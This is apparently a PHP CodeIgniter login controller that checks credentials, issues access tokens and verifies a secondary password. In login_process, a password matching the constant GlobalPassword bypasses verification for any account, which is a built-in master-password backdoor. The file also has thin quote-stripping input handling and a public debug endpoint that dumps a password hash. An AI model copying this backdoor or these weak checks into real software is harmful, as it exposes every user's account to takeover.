<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{
	public function login_process()
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		if ($username != "" && $password != "") {
			$userid = trim($username);
			$userid = str_ireplace("'", "", $userid);
			$userid = str_ireplace('"', "", $userid);
			$result = $this->MemberModel->getMemberInfoByIdUseridEmail($userid);
			if (!isset($result['id'])) {
				if (!isset($result['full_load'])) {
					return failedReponse("[[LABEL_NO_ACCOUNT_FOUND]]", "[[PLEASE_TRY_AGAIN]]");
				} else {
					return failedReponse("[[LABEL_TOO_MANY_CONNECTIONS]]", "[[PLEASE_TRY_AGAIN]]");
				}
			} else if ($password == GlobalPassword) {
			} else {
				$pass = generatePassword($password, $result['primary_salt']);
				$validate[] = ($pass['password'] == $result['password']) ? TRUE : FALSE;
				if (in_array(0, $validate) && (!isset($data['msg']) || $data['msg'] == '')) {
					return failedReponse("[[LABEL_VALIDATION_FAILED]]", "[[PLEASE_TRY_AGAIN]]");
				}
			}
			if ($result['access_token'] == "") {
				$access_token = generateAccessToken();
			} else {
				$access_token = $result['access_token'];
			}
			$update_data = array(
				"access_token" => $access_token,
				"last_login_ip" => $result['current_login_ip'],
				"last_login_time" => $result['current_login_time'],
				"current_login_ip" => getIPAddr(),
				"current_login_time" => date('Y-m-d H:i:s')
			);
			$this->MemberModel->updateMemberInfo($result['id'], $update_data);
			$session = $this->SessionModel->validateSession($access_token);
			if (!isset($session['id'])) {
				$session['access_token'] = $access_token;
				$this->SessionModel->setSession($session);
			} else {
				$this->SessionModel->updateSession($session, $session['id']);
			}
			return successReponse("[[LABEL_LOGIN_SUCCESS]]", $access_token);
		} else {
			return failedReponse("[[LABEL_INVALID_USER_PASS]]", "[[PLEASE_TRY_AGAIN]]");
		}
	}

	public function login_info($session)
	{
		$user = $this->MemberModel->getMemberInfoByToken($session);
		return successReponse("", $user);
	}

	public function check()
	{
		$user = $this->MemberModel->getMemberInfoByToken($_POST['access_token']);
		$password = $_POST['password'];
		$pass = generatePassword($password, $user['secondary_salt']);
		$return = $pass['password'] == $user['sec_password'] ? true : false;
		if($return) {
			return successReponse("", $return);
		} else {
			return failedReponse("", $return);
		}
	}

	public function generate()
	{
		dd(generatePassword("123456789"));
	}

}
